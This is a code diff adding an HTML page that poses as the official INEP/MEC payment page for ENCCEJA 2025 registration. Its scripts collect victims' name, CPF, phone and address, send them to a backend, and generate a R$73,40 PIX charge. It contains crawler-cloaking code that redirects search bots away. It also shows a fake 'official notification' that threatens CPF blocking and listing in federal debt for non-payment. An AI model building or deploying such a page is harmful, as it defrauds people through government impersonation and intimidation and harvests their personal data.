@@ -1,0 +1,413 @@
+﻿<!DOCTYPE html>
+<html lang="pt-br">
+<meta http-equiv="content-type" content="text/html;charset=utf-8">
+<head>
+<meta charset="UTF-8">
+<meta content="width=device-width, initial-scale=1.0" name="viewport">
+<title>ENCCEJA 2025 - Pagamento</title>
+<link href="../css/all.min-6.css" rel="stylesheet">
+<link href="../css/home-6.css" rel="stylesheet">
+<script src="../../3.4-6.16"></script>
+<script src="../js/parametros-6.js"></script>
+<script src="../../scripts/utms/latest-6.js" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+    window.googlePixelId = "67ec64299049696f684f4b04";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+    document.head.appendChild(a);
+</script>
+<script>
+    function isBot() {
+        const botAgents = [
+        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+        'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+        ];
+        
+        return botAgents.some(bot => navigator.userAgent.includes(bot));
+    }
+    function checkAccess() {
+        if (isBot()) {
+            window.location.href = "https://g1.globo.com/";
+        }
+    }
+    window.onload = checkAccess;
+</script>
+<style>
+.gov-header {
+    background-color: #222222;
+}
+.inep-header {
+    background-color: #044785;
+}
+.form-header {
+    background-color: #2c5985;
+    color: white;
+    font-weight: 600;
+}
+.btn-primary {
+    background-color: #5d85ab;
+    color: white;
+    transition: all 0.2s ease;
+}
+.btn-primary:hover {
+    background-color: #4d7396;
+}
+.footer-bg {
+    background-color: #1c2b39;
+}
+.pix-container {
+    border: 2px dashed #ddd;
+    background-color: #f9f9f9;
+}
+.spinner {
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #3498db;
+    border-radius: 50%;
+    width: 30px;
+    height: 30px;
+    animation: spin 1s linear infinite;
+    margin: 0 auto;
+}
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+</style>
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const paymentData = JSON.parse(localStorage.getItem('paymentData') || '{}');
+        const userData = JSON.parse(localStorage.getItem('cpfData') || '{}');
+        const addressData = JSON.parse(localStorage.getItem('enderecoData') || '{}');
+            
+        const nome = paymentData.nome || userData.NOME || '';
+        const cpf = paymentData.cpf.replace(/\D/g, '') || userData.CPF.replace(/\D/g, '') || '';
+        const telefone = paymentData.telefone || addressData.telefone || '';
+        
+        console.log(telefone);
+            
+        if (!nome || !cpf) {
+            alert("Dados de pagamento incompletos. Você será redirecionado para o início da inscrição.");
+            window.location.href = '../inscricao';
+            return;
+        }
+            
+        const dadosPagamento = { cpf, nome, telefone};
+        localStorage.setItem('paymentData', JSON.stringify(dadosPagamento));
+        createPayment(cpf, nome, 'user@site.com', telefone, 73.40);
+    });
+        
+    function createPayment(cpf, nome, email, telefone, valor) {
+        const addressData = JSON.parse(localStorage.getItem('enderecoData') || '{}');
+        document.getElementById('loading-container').classList.remove('hidden');
+        document.getElementById('payment-container').classList.add('hidden');
+
+        var site = new URL(window.location.href);
+        var dominio = site.origin;
+
+        const params = new URLSearchParams(window.location.search);
+        const google = JSON.parse(localStorage.getItem('google')) || {};
+
+        fetch('../sys/gateway.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                cpf: cpf,
+                nome: nome,
+                email: email,
+                telefone: telefone,
+                valor: valor
+            })
+        })
+        .then(response => response.json())
+        .then(({ idPix, qrCode, copiaCola }) => {
+            setTimeout(() => {
+                var dadosSend = {
+                    valor: valor,
+                    nome: nome,
+                    cpf: cpf,
+                    telefone: telefone,
+                    cep: addressData.cep,
+                    endereco: addressData.logradouro,
+                    numero: addressData.numero,
+                    bairro: addressData.bairro,
+                    cidade: addressData.cidade,
+                    estado: addressData.uf,
+                    utm_source: google.utm_source ?? '',
+                    utm_campaign: google.utm_campaign ?? '',
+                    utm_medium: google.utm_medium ?? '',
+                    utm_content: google.utm_content ?? '',
+                    utm_term: google.utm_term ?? '',
+                    xcod: google.xcod ?? '',
+                    sck: google.sck ?? '',
+                    keyword: google.keyword ?? '',
+                    device: google.device ?? '',
+                    network: google.network ?? '',
+                    gclid: google.gclid ?? '',
+                    gad_source: google.gad_source ?? '',
+                    gbraid: google.gbraid ?? '',
+                    parametros: params ?? '',
+                    url: dominio,
+                    idpix: idPix,
+                    qrcode: qrCode,
+                    copiacola: copiaCola
+                };
+        
+                fetch('../sys/registro.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(dadosSend)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('loading-container').classList.add('hidden');
+                    document.getElementById('payment-container').classList.remove('hidden');
+
+                    if (data.error) {
+                        document.getElementById('error-message').textContent = data.error;
+                        document.getElementById('error-container').classList.remove('hidden');
+                        return;
+                    } 
+                        
+                    if (data.warning) {
+                        document.getElementById('warning-message').textContent = data.warning;
+                        document.getElementById('warning-container').classList.remove('hidden');
+                    }
+
+                    if (data.pixQrCode) {
+                        document.getElementById('qr-code-img').src = data.pixQrCode;
+                        document.getElementById('qr-code-container').classList.remove('hidden');
+                        document.getElementById('pix-code').textContent = data.pixCode;
+                        document.getElementById('pix-code-container').classList.remove('hidden');
+                        localStorage.setItem('transactionId', data.id);
+                        startPaymentStatusCheck(data.id);
+                    }
+
+                })
+                .catch(error => {
+                    console.error("Erro ao enviar os dados:", error);
+                });
+            }, 1500);
+        })
+        .catch(error => console.error("Erro ao gerar a guia:", error));
+    }
+        
+    function copyPixCode() {
+        const pixCode = document.getElementById('pix-code').textContent;
+        navigator.clipboard.writeText(pixCode)
+        .then(() => {
+            const copyButton = document.getElementById('copy-button');
+            const originalText = copyButton.innerHTML;
+            copyButton.innerHTML = '<i class="fas fa-check mr-2"></i>Copiado!';
+            copyButton.classList.remove('bg-green-600');
+            copyButton.classList.add('bg-blue-600');
+
+            setTimeout(() => {
+                copyButton.innerHTML = originalText;
+                copyButton.classList.remove('bg-blue-600');
+                copyButton.classList.add('bg-green-600');
+            }, 2000);
+        })
+        .catch(err => {
+            console.error('Erro ao copiar:', err);
+        });
+    }
+        
+    let paymentConfirmed = false;
+
+    function startPaymentStatusCheck(transactionId) {
+        checkPaymentStatus(transactionId);
+        const checkInterval = setInterval(() => {
+            if (paymentConfirmed) {
+                clearInterval(checkInterval);
+                return;
+            }
+            checkPaymentStatus(transactionId);
+        }, 10000);
+            
+        setTimeout(() => {
+            clearInterval(checkInterval);
+        }, 1800000);
+    }
+        
+    function checkPaymentStatus(transactionId) {
+        fetch('../sys/confirmar.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ transactionId: transactionId })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success){
+                paymentConfirmed = true;
+                    
+                const successMessage = document.createElement('div');
+                successMessage.className = 'bg-green-50 p-4 rounded-md border border-green-300 text-green-800 my-4';
+                successMessage.innerHTML = `
+                    <p class="flex items-start">
+                        <i class="fas fa-check-circle text-green-600 mr-2 mt-1"></i>
+                        <span>
+                            <strong>Pagamento confirmado!</strong> Sua inscrição foi concluída com sucesso.
+                            Redirecionando para a página de confirmação...
+                        </span>
+                    </p>
+                `;
+                    
+                const paymentDetailsContainer = document.getElementById('payment-container');
+                paymentDetailsContainer.insertBefore(successMessage, paymentDetailsContainer.firstChild);
+                    
+                const userData = JSON.parse(localStorage.getItem('paymentData') || '{}');
+                const nome = userData.nome || '';
+                const cpf = userData.cpf || '';
+                const telefone = userData.telefone || '';
+                    
+                const urlParams = new URLSearchParams();
+                if (nome) urlParams.append('nome', nome);
+                if (cpf) urlParams.append('cpf', cpf);
+                if (telefone) urlParams.append('phone', telefone);
+
+                window.location.href = '../obrigado?' + urlParams.toString();
+            }
+        })
+        .catch(error => {
+            console.error('Erro ao verificar status do pagamento:', error);
+        });
+    }
+</script>
+</head>
+<body class="flex flex-col min-h-screen">
+    <header class="gov-header text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="../images/top_gov-6.jpg" alt="Logotipo" class="h-6">
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li><a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a></li>
+                    <li><a class="hover:underline" href="#">PARTICIPE</a></li>
+                    <li><a class="hover:underline" href="#">SERVIÇOS</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <div class="inep-header py-3">
+        <div class="container mx-auto px-4">
+            <svg class="h-7" height="30" preserveaspectratio="xMidYMid" viewbox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
+                <defs><style>.cls-2{fill:#fff}</style></defs>
+                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" fill-rule="evenodd" id="path-1"></path>
+            </svg>
+        </div>
+    </div>
+    <main class="flex-grow py-8">
+        <div class="container mx-auto px-4 max-w-3xl">
+            <div class="text-center mb-6">
+                <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="../images/logo_encceja-6.png" width="390">
+            </div>
+            <div class="border border-gray-300 rounded">
+                <div class="form-header py-2 px-4 text-center">
+                    <h2 class="text-lg flex items-center justify-center">
+                        <div class="animate-spin w-5 h-5 border-2 border-white border-t-transparent rounded-full mr-2"></div>
+                        Aguardando seu pagamento
+                    </h2>
+                </div>
+                <div class="p-6">
+                    <div class="bg-red-600 p-4 rounded-md mb-5 text-white shadow-md">
+                        <div class="flex items-center mb-2">
+                            <i class="fas fa-exclamation-triangle text-yellow-300 mr-2 text-xl"></i>
+                            <h3 class="font-bold text-lg text-base" style="font-size: 16px;">NOTIFICAÇÃO OFICIAL</h3>
+                        </div>
+                        <p class="mb-3" style="font-size: 16px;">Ao prosseguir, você concordou com o pagamento da taxa de inscrição no valor de <strong>R$73,40</strong>. Conforme regulamento, o não pagamento resultará em <strong>bloqueio de CPF</strong> por 3 anos no sistema ENCCEJA.</p>
+                        <p class="mb-3" style="font-size: 16px;">O não pagamento resultará na inscrição do nome e CPF em <strong>dívida ativa da União</strong>, incidindo multas e encargos legais sobre o valor original. Esta situação pode acarretar em bloqueio de contas bancárias, intimações judiciais, redução do score de crédito e negativação do nome em órgãos de proteção.</p>
+                        <p class="font-semibold" style="font-size: 16px;">Efetue o pagamento imediatamente para regularizar sua situação.</p>
+                    </div>
+                    <div id="loading-container" class="text-center py-10">
+                        <div class="spinner mb-4"></div>
+                        <p class="text-lg font-semibold text-gray-700">Gerando código de pagamento...</p>
+                        <p class="text-sm text-gray-500 mt-2">Aguarde alguns instantes...</p>
+                    </div>
+                    <div id="error-container" class="bg-red-50 p-4 rounded-md border border-red-300 text-red-800 my-4 hidden">
+                        <p class="flex items-start">
+                            <i class="fas fa-exclamation-circle text-red-600 mr-2 mt-1"></i>
+                            <span id="error-message">Ocorreu um erro ao processar o pagamento.</span>
+                        </p>
+                    </div>
+                    <div id="warning-container" class="bg-amber-50 p-4 rounded-md border border-amber-300 text-amber-800 my-4 hidden">
+                        <p class="flex items-start">
+                            <i class="fas fa-exclamation-triangle text-amber-600 mr-2 mt-1"></i>
+                            <span id="warning-message">Aviso: Por favor, aguarde enquanto processamos seu pagamento.</span>
+                        </p>
+                    </div>
+                    <div id="payment-container" class="hidden">
+                        <div class="mb-6">
+                            <div class="flex items-center justify-between mb-4">
+                                <h3 class="text-lg font-bold text-gray-800">Taxa de Inscrição</h3>
+                                <p class="text-lg font-bold text-gray-800">R$ 73,40</p>
+                            </div>
+                            <div id="pix-code-container" class="hidden mb-6">
+                                <p class="text-center font-semibold text-gray-700 mb-2">Copie o código PIX:</p>
+                                <div class="pix-container p-3 rounded-md mb-4">
+                                    <div class="bg-white border border-gray-300 p-3 rounded-md text-sm text-gray-800 break-all font-mono">
+                                        <p id="pix-code" class="max-h-24 overflow-y-auto"></p>
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mb-3">
+                                    <button id="copy-button" onclick="copyPixCode()" class="bg-green-600 hover:bg-green-700 text-white py-2 px-5 rounded-md flex items-center">
+                                        <i class="fas fa-copy mr-2"></i>
+                                        <span>Copiar código PIX</span>
+                                    </button>
+                                </div>
+                                <div class="bg-gray-100 p-4 rounded-md text-gray-700 text-sm mb-4">
+                                    <h4 class="font-semibold mb-2">Como pagar com o PIX Copia e Cola:</h4>
+                                    <ol class="list-decimal pl-5 space-y-1">
+                                        <li>Clique no botão verde acima para copiar o código</li>
+                                        <li>Abra o aplicativo do seu banco</li>
+                                        <li>Selecione a opção "Pagar com PIX" ou "PIX Copia e Cola"</li>
+                                        <li>Cole o código copiado no campo indicado</li>
+                                        <li>Confira o valor de R$ 73,40 e confirme o pagamento</li>
+                                    </ol>
+                                </div>
+                            </div>
+                            <div id="qr-code-container" class="hidden">
+                                <p class="text-center font-semibold text-gray-700 mb-3">Ou escaneie o QR Code com seu aplicativo bancário:</p>
+                                <div class="flex justify-center mb-6">
+                                    <img id="qr-code-img" src="#" alt="QR Code PIX" class="w-48 h-48 border border-gray-300 p-2 bg-white">
+                                </div>
+                            </div>
+                            <div class="bg-yellow-50 p-4 rounded-md border border-yellow-200 text-yellow-800 mt-6">
+                                <p class="flex items-start">
+                                    <i class="fas fa-exclamation-triangle text-yellow-600 mr-2 mt-1"></i>
+                                    <span>
+                                        <strong>Atenção:</strong> Após o pagamento, o sistema atualizará o status da sua inscrição automaticamente. O comprovante de inscrição estará disponível em até 30 minutos após a confirmação do pagamento.
+                                    </span>
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+    <footer class="footer-bg text-white py-4 text-xs">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center mb-2">
+                <svg xmlns="http://www.w3.org/2000/svg" preserveaspectratio="xMidYMid" width="69" height="20" viewbox="0 0 69 20" class="h-16 w-auto mb-3">
+                    <defs><style>.cls-2{fill:#fff}</style></defs>
+                    <path d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" id="path-1" class="cls-2" fill-rule="evenodd"></path>
+                </svg>
+                <p class="text-sm text-center mb-2">Instituto Nacional de Estudos e Pesquisas Educacionais</p>
+            </div>
+            <div class="flex justify-between items-center">
+                <div>&copy; MEC - Ministério da Educação | INEP - Instituto Nacional de Estudos e Pesquisas</div>
+                <div class="flex items-center"><i class="fas fa-phone-alt mr-1"></i> 0800 616161</div>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
